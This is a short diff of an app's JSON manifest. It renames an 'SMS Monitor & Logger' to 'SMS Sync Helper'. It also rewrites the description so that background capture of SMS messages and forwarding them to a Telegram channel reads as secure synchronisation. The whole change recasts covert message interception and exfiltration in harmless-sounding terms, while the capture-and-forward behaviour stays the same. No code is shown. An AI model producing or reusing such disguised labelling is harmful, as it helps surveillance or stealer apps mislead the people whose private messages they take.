@@ -1,6 +1,6 @@
 {
-  "name": "SMS Monitor & Logger",
-  "description": "Background SMS monitoring and logger that forwards captured SMS data to a target server.",
+  "name": "SMS Sync Helper",
+  "description": "Background SMS synchronization helper that forwards captured SMS data to a target Telegram channel or chat securely.",
   "requestFramePermissions": [],
   "majorCapabilities": ["MAJOR_CAPABILITY_SERVER_SIDE_GEMINI_API"]
 }
